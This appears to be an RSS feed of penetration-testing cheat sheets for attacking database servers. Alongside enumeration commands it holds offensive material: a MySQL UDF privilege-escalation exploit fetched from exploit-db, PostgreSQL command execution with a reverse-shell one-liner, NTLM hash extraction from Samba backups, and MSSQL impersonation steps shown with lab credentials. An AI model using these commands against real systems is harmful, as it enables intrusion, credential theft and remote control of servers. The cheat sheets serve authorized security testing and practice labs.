channel.title: Database on TLDRBins
channel.description: Recent content in Database on TLDRBins

item.title: CouchDB
item.description: General # Show all databases curl http://localhost:5984/_all_dbs # Show all databases (With Creds) curl http://<USER>:<PASSWORD>@localhost:5984/_all_dbs # Show all docs from database curl http://localhost:5984/<DB_NAME>/_all_docs # Show a entry curl http://localhost:5984/<DB_NAME>/<ID_HASH>

item.title: Elasticsearch
item.description: General # List indexes curl -s <TARGET>:9200/_cat/indices?v # Dump data with index name curl -s -X GET "<TARGET>:9200/<INDEX_NAME>/_search?size=100" -H 'Content-Type: application/json' -d' { "query": { "match_all": {} } } ' | jq .

item.title: Graphql
item.description: Visualize Tool +---------------------------------------------------------------+ | 1. Change Schema -> Introspection -> Copy Introspection Query | | 2. Paste query | | 3. Display | +---------------------------------------------------------------+ Ref: graphql-voyager General # Get fields from schema curl -s <TARGET>:3000/graphql -H "Content-Type: application/json" -d '{"query":"{__schema{queryType{name,fields{name,description}}}}"}' | jq . # Get types name curl -s <TARGET>:3000/graphql -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}' | jq . # Get fields of type (e.g. User) curl -s <TARGET>:3000/graphql -H "Content-Type: application/json" -d '{"query":"{__type(name:\"User\"){name,fields{name}}}"}' | jq .

item.title: Microsoft Access Database
item.description: General mdbtools 0. Installation [Optional] sudo apt install mdbtools Show All Tables mdb-tables <MDB_FILE> $ mdb-tables backup.mdb acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock ---[SNIP]--- Show Tables with Data mdb-tables <MDB_FILE> | tr ' ' '\n' | grep . | while read table; do lines=$(mdb-export <MDB_FILE> $table | wc -l); if [ $lines -gt 1 ]; then echo "$table: $lines"; fi; done $ mdb-tables backup.mdb | tr ' ' '\n' | grep .

item.title: MongoDB General
item.description: Connect to Mongo Database anonymous authenticate mongosh <TARGET>:27017 $ mongosh 172.17.0.3:27017 Current Mongosh Log ID: 66f2fa2192b07a1eeb856ec6 Connecting to: mongodb://172.17.0.3:27017/?directConnection=true&appName=mongosh+2.2.12 Using MongoDB: 5.0.6 Using Mongosh: 2.2.12 For mongosh info see: https://docs.mongodb.com/mongodb-shell/ ------ The server generated these startup warnings when booting 2024-09-24T10:44:22.876+00:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem 2024-09-24T10:44:23.824+00:00: Access control is not enabled for the database. Read and write access to data and configuration is unrestricted ------ Warning: Found ~/.

item.title: MSSQL Agent Jobs
item.description: 1. Pre-Check # List principals SELECT name FROM sys.database_principals; # Check privilege over a principal from current user SELECT entity_name, permission_name FROM fn_my_permissions('<PRINCIPAL>', 'USER'); # Fix : Cannot resolve the collation conflict between "Latin1_General_CI_AI" and "SQL_Latin1_General_CP1_CI_AS" SELECT entity_name collate DATABASE_DEFAULT,permission_name collate DATABASE_DEFAULT FROM fn_my_permissions('<PRINCIPAL>', 'USER'); # Check SQL credentials SELECT name, credential_identity FROM sys.credentials; 2. Check Proxy Account Name and Permissions # Create a table to store info CREATE TABLE proxies (subsystem_id INT PRIMARY KEY NOT NULL, subsystem_name varchar(255), proxy_id INT, proxy_name varchar(255)); # Insert proxy info into table EXECUTE AS LOGIN='<PRINCIPAL>'; INSERT proxies EXEC msdb.

item.title: MSSQL General
item.description: Connect to MSSQL DB Linux Windows # Password impacket-mssqlclient '<USER>:<PASSWORD>@<TARGET>' # Without TLS impacket-mssqlclient -windows-auth '<USER>:<PASSWORD>@<TARGET>' # Kerberos impacket-mssqlclient -k <TARGET> # With Current User sqlcmd -S '<TARGET>' -Q "<QUERY>" # With Cred sqlcmd -S '<TARGET>' -U '<USER>' -P '<PASSWORD>' -d '<DB_NAME>' -Q "<QUERY>" General # Check mssql version SELECT @@version; # Check current user SELECT suser_name(); # Check users SELECT name FROM master..syslogins # Check users SELECT name FROM master.

item.title: MSSQL Linked Servers
item.description: Enum SQL nxc Hint: Use double '' to escape ' in mssql # Show current server select @@servername # Show linked servers select srvname from sysservers; # Show linked servers enum_links 1. Enumerate Linked MSSQL Servers nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M enum_links $ nxc mssql DC.REDELEGATE.VL -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth -M enum_links MSSQL 10.129.254.242 1433 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl) MSSQL 10.

item.title: MSSQL Privilege Escalation
item.description: Enum Linux Windows 1. List Users that Can be Impersonated nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M enum_impersonate $ nxc mssql DC.REDELEGATE.VL -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth -M enum_impersonate MSSQL 10.129.254.242 1433 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl) MSSQL 10.129.254.242 1433 DC [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii ENUM_IMP... 10.129.254.242 1433 DC [-] No users with impersonation rights found. 2. Enumerate Active MSSQL Logins nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M enum_logins $ nxc mssql DC.

item.title: MySQL General
item.description: Connect to MySQL Database mysql -u <USER> -h <TARGET> -p'<PASSWORD>' # Database known mysql -u <USER> -D <DB_NAME> -h <TARGET> -p'<PASSWORD>' # Skip SSL mysql -u <USER> -h <TARGET> -p'<PASSWORD>' --skip-ssl # Execute query inline mysql -u <USER> -D <DB_NAME> -h <TARGET> -p'<PASSWORD>' -e '<QUERY>' mysql -u <USER> -D <DB_NAME> -h <TARGET> -p'<PASSWORD>' -e 'show tables;' General # Show all databases show databases; # Choose database use <DB_NAME>; # Show all tables show tables; # Show all entries in table_name select * from <TABLE_NAME>; Insert Entry INSERT INTO <TABLE_NAME> (<COLUMN_1>,<COLUMN_2>,.

item.title: MySQL Privilege Escalation
item.description: Abuse #1: User Defined Function (UDF) # Get the raptor_udf2.c wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c # Compile the source script gcc -g -c raptor_udf2.c gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc # Copy to target folder cp raptor_udf2.so /dev/shm/raptor_udf2.so # Connect to database as root mysql -u root -p<PASSWORD> mysql # UDF create table foo(line blob); insert into foo values(load_file('/dev/shm/raptor_udf2.so')); # Get plug-in directory show variables like '%plugin%'; +-----------------+---------------------------------------------+ | Variable_name | Value | +-----------------+---------------------------------------------+ | plugin_dir | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ | | plugin_maturity | gamma | +-----------------+---------------------------------------------+ # Copy the plugin_dir value select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.

item.title: Oracle Database
item.description: Tools sqlplus ODAT # Installation sudo apt install oracle-instantclient-sqlplus # export LD_LIBRARY_PATH export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH} # Check sqlplus -V # Installation sudo apt install odat # Check odat --version Ref: Download ODAT Enum # SID enum (You only need one) odat sidguesser -s <TARGET> $ ./odat-libc2.17-x86_64 sidguesser -s 10.129.95.188 [1] (10.129.95.188:1521): Searching valid SIDs [1.1] Searching valid SIDs thanks to a well known SID list on the 10.129.95.188:1521 server [+] 'XE' is a valid SID.

item.title: PostgreSQL
item.description: Connect psql -h <TARGET> -U <USER> psql -h <TARGET> -U <USER> -p <PORT> -d <DB_NAME> psql 'postgresql://<USER>:<PASSWORD>@<TARGET>:5432/<DB_NAME>' General # Show databases \list # Use database \connect <DB_NAME> # Show tables \dt # Disable pager \pset pager 0 # Dump from table select * from "<TABLE_NAME>"; # Insert into table insert into "<TABLE_NAME>" (<COLUMN_1>, <COLUMN_2>) values ('<VALUE_1>', '<VALUE_2>'); # Update table update "<TABLE_NAME>" set <COLUMN_1> = '<VALUE_1>' where <COLUMN_2> = '<VALUE_2>'; # Write text copy (select '<STRING>') to '<TARGET_PATH>'; # List all user accounts \du+ # Exit \q File Read # List directory SELECT * FROM pg_ls_dir('<DIR_PATH>'); # File read SELECT pg_read_file('<FILE_PATH>', 0, 4096); RCE # Only for superuser CREATE TABLE IF NOT EXISTS exec(string text); # Code execution COPY exec FROM PROGRAM '<CMD>'; # Check ouput SELECT * FROM exec; # One-liner DO $$ DECLARE c text; BEGIN c := 'COPY (SELECT '''') to program ''bash -c "bash -i >& /dev/tcp/<LOCAL_IP>/<PORT> 0>&1"'''; EXECUTE c; END $$;

item.title: Redis
Samba
item.description: Priesc #1: Retrieve NTLM from Samba Backup ldbsearch 1. Query 'unicodepwd' of Target User ldbsearch -H sam.ldb '(samaccountname=<USER>)' 'unicodepwd' $ ldbsearch -H sam.ldb '(samaccountname=Administrator)' 'unicodepwd' # record 1 dn: CN=Administrator,CN=Users,DC=example,DC=com unicodePwd:: iEb36u6PsRetBr3YMLdYbA== # Referral ref: ldap:///CN=Configuration,DC=example,DC=com # Referral ref: ldap:///DC=DomainDnsZones,DC=example,DC=com # Referral ref: ldap:///DC=ForestDnsZones,DC=example,DC=com # returned 4 records # 1 entries # 3 referrals 2. Convert to Hex echo -n '<UNICODEPWD>' | base64 -d | xxd -p $ echo -n 'iEb36u6PsRetBr3YMLdYbA==' | base64 -d | xxd -p 8846f7eaee8fb117ad06bdd830b7586c 3.

item.title: SQL Injection
item.description: sqlmap 1. Copy HTTP Request +---------------------------------------------------------------+ | In Burp Suite => Right click request => Select `copy to file` | | Add `*` to the SQL injection point | +---------------------------------------------------------------+ 2. Initial Enum # HTTP sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 # HTTPS sqlmap -r request --batch --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --force-ssl # String to match when query is evaluated to True sqlmap -r request --batch --proxy=http://127.

item.title: SQLite
item.description: General # Open a db sqlite3 <DB_FILE> # Show tables .tables # Show schema of a table .schema <TABLE_NAME> # Show column headers .headers on # Dump data select * from <TABLE_NAME>;
